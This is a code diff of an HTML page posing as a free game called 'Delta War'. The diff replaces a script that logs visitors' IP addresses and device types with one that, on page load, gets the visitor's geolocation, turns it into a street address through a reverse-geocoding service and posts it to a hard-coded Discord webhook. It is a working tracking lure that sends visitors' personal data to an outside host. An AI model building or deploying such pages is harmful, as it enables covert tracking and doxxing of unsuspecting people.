@@ -4,50 +4,34 @@
  <meta charset="UTF-8">
  <title>Delta War | Play Free Now</title>
 </head>
-<body onload="logIP()">
+<body onload="logLocation()">
  <!-- Fake content here -->
- <h1>Your ip is currently being sent to Cdrillluhs IPL(</h1>
+ <h1>Your location is currently being sent to Cdrillluhs IPL(</h1>
 
  <script>
- async function logIP() {
- const ipResponse = await fetch('https://api.ipify.org');
- const ip = await ipResponse.text();
- const userAgent = navigator.userAgent;
- const webhookURL = 'https://discord.com/api/webhooks/1543545525821767750/6eYDQxde7zpBEwGEI8eLDnpewZynTvxDuBjwm9HPCMnZZStybikfq6FuZwhw_RXmdRyL';
+ async function logLocation() {
+ if (navigator.geolocation) {
+ navigator.geolocation.getCurrentPosition(position => {
+ const latitude = position.coords.latitude;
+ const longitude = position.coords.longitude;
 
- // Basic device detection
- let deviceType;
- if (userAgent.match(/iPhone/i)) {
- const match = userAgent.match(/iPhone(\d+)/);
- if (match) {
- deviceType = `iPhone ${match[1]}`;
- } else {
- deviceType = "Unknown iPhone";
- }
- } else if (userAgent.match(/iPad/i)) {
- deviceType = "iPad";
- } else if (userAgent.match(/Android/i)) {
- const match = userAgent.match(/SM-A\d{2}0|SM-N\d{4}/); // Example regex for Samsung models
- if (match) {
- deviceType = `Samsung ${match[0]}`;
- } else {
- deviceType = "Android Device";
- }
- } else if (userAgent.match(/Windows NT 10.0/i)) {
- deviceType = "Windows 10";
- } else if (userAgent.match(/Windows NT 11.0/i)) {
- deviceType = "Windows 11";
- } else if (userAgent.match(/Mac OS X/i)) {
- deviceType = "macOS Device";
- } else {
- deviceType = "Unknown Device";
- }
+ // Reverse geocode coordinates to address
+ fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`)
+ .then(response => response.json())
+ .then(data => {
+ const address = data.display_name;
+ const webhookURL = 'https://discord.com/api/webhooks/1543545525821767750/6eYDQxde7zpBEwGEI8eLDnpewZynTvxDuBjwm9HPCMnZZStybikfq6FuZwhw_RXmdRyL';
 
  fetch(webhookURL, {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
- body: JSON.stringify({ content: `Logged IP: ${ip} | Device: ${deviceType}` }),
+ body: JSON.stringify({ content: `Logged Location: ${address}` }),
  });
+ });
+ }, error => console.error("Error getting location:", error));
+ } else {
+ alert("Geolocation is not supported by this browser.");
+ }
  }
  </script>
 </body>
